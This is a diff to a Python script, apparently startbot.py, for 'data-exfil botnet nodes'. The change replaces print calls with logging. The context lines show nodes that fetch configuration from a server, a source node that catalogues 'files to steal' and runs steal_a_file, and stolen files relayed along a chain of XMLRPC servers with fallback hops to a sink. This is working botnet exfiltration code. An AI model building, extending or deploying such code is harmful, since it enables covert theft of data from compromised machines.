@@ -1,6 +1,6 @@
+import os, re, socket, subprocess, sys, time, shutil, logging
 import xml.etree.ElementTree as etree
 import sqlite3 as sql
-import os, re, socket, subprocess, sys, time, shutil
 import urllib.request
 import multiprocessing as mp
 import xmlrpc.client
@@ -36,7 +36,8 @@ class RequestHandler(ThreadingMixIn, SimpleXMLRPCRequestHandler):
         try:
             self.server = SimpleXMLRPCServer((ip, port))
         except Exception as e:
-            print(strftime('%H:%M:%S') + ' The XMLRPC server won\'t start:', e)
+            #print(strftime('%H:%M:%S') + ' The XMLRPC server won\'t start:', e)
+            logger.critical('The XMLRPC server won\'t start: %s', e)
             sys.exit(1)
         # A synchronization variable so we're not fighting with clients over files
         # in the data directory
@@ -48,20 +49,23 @@ class RequestHandler(ThreadingMixIn, SimpleXMLRPCRequestHandler):
             try:
                 os.makedirs(data_dir)
             except OSError as e:
-                print(strftime('%H:%M:%S') + ' ERROR: XMLRPC server unable to create data directory:', e)
+                #print(strftime('%H:%M:%S') + ' ERROR: XMLRPC server unable to create data directory:', e)
+                logger.critical('ERROR: XMLRPC server unable to create data directory: %s', e)
                 sys.exit(1)
         try:
             self.server.serve_forever()
         except KeyboardInterrupt:
-            print(strftime('%H:%M:%S') + ' Bye from the XMLRPC server!')
+            #print(strftime('%H:%M:%S') + ' Bye from the XMLRPC server!')
+            logger.info('XMLRPC server exiting normally in response to KILL signal')
             sys.exit(0)
-            
+
     def server_receive_file(self, filename, contents):
         self.lock.acquire()
         with open(data_dir + '/' + filename, "wb") as handle:
             handle.write(contents.data)
         self.lock.release()
         return True                                                                                                                                            
+### End of RequestHandler class ###
 
 def get_my_IP():
     p=subprocess.Popen('ifconfig',stdout=subprocess.PIPE,stderr=None,shell=True)
@@ -106,7 +110,8 @@ def create_file_db(conn):
         conn.commit()
         c.close()
     except Exception as e:
-        print('ERROR: Unable to create file table:', e, 'Exiting...')
+        #print('ERROR: Unable to create file table:', e, 'Exiting...')
+        logger.critical('ERROR: Unable to create file table: %s', e)
         sys.exit(1)
     
 def steal_a_file(conn, my_ip):
@@ -158,20 +163,24 @@ def forward_files(proxy, hops, files, lock):
     # checks down the sequence until either a server answers or we run out of servers to try.
     hop = 0
     while hop < len(hops):
-        print(strftime('%H:%M:%S') + ' Trying to forward my files to', proxy)
+        #print(strftime('%H:%M:%S') + ' Trying to forward my files to', proxy)
+        logger.info('Trying to forward my files to %s', proxy)
         try:
             proxy.system.listMethods()
             break
         except Exception as e:
             hop += 1
-            print(strftime('%H:%M:%S') + ' Warning: Client unable to connect to downstream server...', end = ' ')
+            #print(strftime('%H:%M:%S') + ' Warning: Client unable to connect to downstream server...', end = ' ')
+            logger.warning('Client unable to connect to downstream server %s', proxy)
             if hop >= len(hops):
-                print('no more hops to try! We\'ll have to transfer these files later.')
+                #print('no more hops to try! We\'ll have to transfer these files later.')
+                logger.warning('No more hops to try. Will attempt to transfer files later.')
                 return
             else:
-                print('trying next hop!')
+                #print('trying next hop!')
                 server_url = 'http://' + next_hops[hop][0] + ':' + next_hops[hop][1] + '/'
                 proxy = xmlrpc.client.ServerProxy(server_url)
+                logger.info('Trying next hop: %s', proxy)
     
     for file in files:
         if os.path.isfile(data_dir + '/' + file):
@@ -188,8 +197,9 @@ def forward_files(proxy, hops, files, lock):
         os.remove(data_dir + '/' + file)
         if lock != None:
             lock.release()
-    print(strftime('%H:%M:%S') + ' Successfully forwarded my files to', proxy)
-
+    #print(strftime('%H:%M:%S') + ' Successfully forwarded my files to', proxy)
+    logger.info('Successfully forwarded my files to %s', proxy)
+    
 def store_bot_info(tree, conn):
     '''Store the data from the XML file in a local SQLite3 database'''
     # Loop through the XML tree and insert the data for each bot
@@ -208,15 +218,27 @@ def store_bot_info(tree, conn):
     c.close()
     
 if __name__=='__main__':
-    '''Main functionality for the data-exfil botnet nodes.
-    If this node is not the source, then an XMLRPC server
-    will be created as a child process. If this node is
-    not the sink, then an XMLRPC client object will be
+    '''Main functionality for the data-exfil botnet nodes. If this node is not the source, then an XMLRPC server
+    will be created as a child process. If this node is not the sink, then an XMLRPC client object will be
     created and managed here, as well.
     '''
-    # Get my ip address
+    ### Set up logging
+    # Create logger
+    logger = logging.getLogger('startbot.py')
+    logger.setLevel(logging.INFO)
+    # Create logging console handler and set level to info
+    ch = logging.StreamHandler()
+    ch.setLevel(logging.INFO)
+    # Create logging formatter
+    formatter = logging.Formatter('%(asctime)s [%(name)s] %(levelname)s: %(message)s', '%b %e %H:%M:%S')
+    # Add formatter to logging console handler
+    ch.setFormatter(formatter)
+    # Add logging console handler to logger
+    logger.addHandler(ch)
+    ### Get my ip address
     my_ip = get_my_IP()
-    print(strftime('%H:%M:%S') + ' My IP is:', my_ip)
+    #print(strftime('%H:%M:%S') + ' My IP is:', my_ip)
+    logger.info('My IP is %s', my_ip)
     # We'll use just one db connection and pass it around, as needed
     conn = sql.connect(db)
     # Get the tree from the men.xml file
@@ -226,15 +248,18 @@ if __name__=='__main__':
         create_men_db(conn)
         store_bot_info(tree, conn)
     else:
-        print(strftime('%H:%M:%S') + ' Can\'t reach the server. Using an old copy, if one exists!')
+        #print(strftime('%H:%M:%S') + ' Can\'t reach the server. Using an old copy, if one exists!')
+        logger.warning('Can\'t reach the server. Using an old copy, if one exists!')
     # What's my assigned server port number and seq_no?
     my_config = get_my_config(conn, my_ip)
     if my_config == None:
-        print(strftime('%H:%M:%S') + ' No botnet info available from XML server for my node! Exiting...')
+        #print(strftime('%H:%M:%S') + ' No botnet info available from XML server for my node! Exiting...')
+        logger.critical('No botnet info available from XML server for my node! Exiting...')
         sys.exit(1)
     my_port, my_seq_no = my_config
     # At this point, we have all the info needed to fire up an XMLRPC server
-    print(strftime('%H:%M:%S') + ' My port number is', my_port, 'and my sequence number is', my_seq_no)
+    #print(strftime('%H:%M:%S') + ' My port number is', my_port, 'and my sequence number is', my_seq_no)
+    logger.info('My port number is %s, and my sequence number is %s', my_port, my_seq_no)
     # We'll only start a server if my_seq_no > 0
     # We also only need a lock if we need a server
     server = None
@@ -244,28 +269,33 @@ if __name__=='__main__':
         # in sync with our XMLRPC server
         lock = mp.Lock()
         try:
-            print(strftime('%H:%M:%S') + ' Spawning child process for XMLRPC server' + '...', end = '')
+            #print(strftime('%H:%M:%S') + ' Spawning child process for XMLRPC server' + '...', end = '')
+            logger.info('Spawning child process for XMLRPC server')
             server = mp.Process(target=RequestHandler, args=(my_ip, int(my_port), lock))
             server.start()
             time.sleep(1)
             if server.is_alive():
-                print('success!')
+                #print('success!')
+                pass
             else:
-                print(strftime('%H:%M:%S') + ' Whoops! The server doesn\'t seem to have started. Exiting...')
+                #print(strftime('%H:%M:%S') + ' Whoops! The server doesn\'t seem to have started. Exiting...')
+                logger.critical('XMLRPC server did not start. Exiting...')
                 sys.exit(1)
-                
         except Exception as e:
-            print(strftime('%H:%M:%S') + ' ERROR: Can\'t start XMLRPC server instance:', e)
+            #print(strftime('%H:%M:%S') + ' ERROR: Can\'t start XMLRPC server instance:', e)
+            logger.critical('Unable to start XMLRPC server instance: %s. Exiting...', e)
     # For all but the source node, the data_dir is created when the server instance
     # is instantiated. This else block ensures that the data_dir exists at the source.
     # We also need to create and populate the database table for files to exfil
     else:
-        print(strftime('%H:%M:%S') + ' My sequence number is 0, so I\'m NOT creating an XMLRPC server' + '...')
+        #print(strftime('%H:%M:%S') + ' My sequence number is 0, so I\'m NOT creating an XMLRPC server' + '...')
+        logger.info('My sequence number is 0, so I\'m NOT creating an XMLRPC server')
         if not os.path.exists(data_dir):
             try:
                 os.makedirs(data_dir)
             except OSError as e:
-                print(strftime('%H:%M:%S') + ' ERROR: XMLRPC client at source unable to create data directory:', e)
+                #print(strftime('%H:%M:%S') + ' ERROR: XMLRPC client at source unable to create data directory:', e)
+                logger.critical('XMLRPC client at source unable to create data directory: %s', e)
                 sys.exit(1)
         # Create the table for files
         create_file_db(conn)
@@ -299,9 +329,11 @@ if __name__=='__main__':
                     except:
                         pass
         # Store the file list in the local database
-        print(strftime('%H:%M:%S') + ' Please wait while I store info on files to steal...')
+        #print(strftime('%H:%M:%S') + ' Please wait while I store info on files to steal...')
+        logger.info('Building data table on files to steal')
         store_file_info(conn, filelst)
-        print(strftime('%H:%M:%S') + ' Okay, all file data has been stored!')
+        #print(strftime('%H:%M:%S') + ' Okay, all file data has been stored!')
+        logger.info('All file data successfully stored')
     # Now, who is our next hop? We need this to define which server
     # to connect our client to, if any...
     next_hops = get_next_hops(conn, my_seq_no)
@@ -318,22 +350,26 @@ if __name__=='__main__':
             # connect. We're taking it on faith at this point that
             # the server will be there when we want it
             proxy = xmlrpc.client.ServerProxy(server_url)
-            print(strftime('%H:%M:%S') + ' Client created for', server_url)
+            #print(strftime('%H:%M:%S') + ' Client created for', server_url)
+            logger.info('Client created for XMLRPC server %s', server_url)
         except Exception as e:
-            print(strftime('%H:%M:%S') + ' ERROR: Unable to create client instance for downstream server:', e, 'Exiting...')
+            #print(strftime('%H:%M:%S') + ' ERROR: Unable to create client instance for downstream server:', e, 'Exiting...')
+            logger.critical('Unable to create client instance for downstream server: %s', e)
             if server != None:
-                print('terminating XMLRPC server process...', end = '')
+                #print('terminating XMLRPC server process...', end = '')
+                logger.info('Terminating XMLRPC server process before exiting')
                 server.terminate()
-            print('exiting.')
+            #print('exiting.')
             sys.exit(1)
     else:
-        print(strftime('%H:%M:%S') + ' No downstream server exists, so skipping XMLRPC client creation.')
-
+        #print(strftime('%H:%M:%S') + ' No downstream server exists, so skipping XMLRPC client creation.')
+        logger.info('No downstream server exists, so skipping XMLRPC client creation.')
     # Here's our 'infinite' loop
     while True:
         try:
             # Whew! Let's get some rest...
-            print(strftime('%H:%M:%S') + ' Resting for', client_delay, 'seconds...')
+            #print(strftime('%H:%M:%S') + ' Resting for', client_delay, 'seconds...')
+            logger.info('Resting for %s seconds...', str(client_delay))
             time.sleep(client_delay)
             # Okay, now let's check on the server, if we have one...
             # If it's not running, we're not doing any good, so we might as well exit.
@@ -346,14 +382,17 @@ if __name__=='__main__':
             if my_seq_no == 0:
                 steal_a_file(conn, my_ip)
             files = os.listdir(data_dir)
-            print(strftime('%H:%M:%S') + ' Files in the data directory:', files)
+            #print(strftime('%H:%M:%S') + ' Files in the data directory:', files)
+            logger.info('Files in the data directory: %s', files)
             # For those bots that have clients, we need to send these files to the
             # downstream server
             if client and len(files) > 0:
                 forward_files(proxy, next_hops, files, lock)
         except KeyboardInterrupt:
-            print(strftime('%H:%M:%S') + ' Main program says bye!')
+            #print(strftime('%H:%M:%S') + ' Main program says bye!')
+            logger.info('Main program shutting down')
             break
         except Exception as e:
-            print(strftime('%H:%M:%S') + ' Something bad happened:', e, 'Not my fault!')
+            #print(strftime('%H:%M:%S') + ' Something bad happened:', e, 'Not my fault!')
+            logger.info('Something bad happened: %s. It\'s not my fault!', e)
             break
